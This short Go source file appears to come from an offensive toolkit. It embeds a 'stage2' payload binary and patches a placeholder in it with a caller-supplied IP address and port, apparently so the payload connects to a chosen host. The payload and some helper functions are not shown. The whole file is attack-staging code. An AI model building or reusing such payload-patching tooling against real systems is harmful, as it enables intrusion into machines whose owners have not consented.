package patching

import (
	_ "embed"
	"net"
)

//go:embed dist/stage2-payload.bin
var stage2Data []byte

var STAGE_2_PATCH_SOCKADDR = []byte("CCDDDD")

func PatchStage2(target net.IP, port uint16) []byte {
	sockAddr := packAddress(target, port)

	patched := PatchBinary(stage2Data, STAGE_2_PATCH_SOCKADDR, sockAddr)

	return patched
}
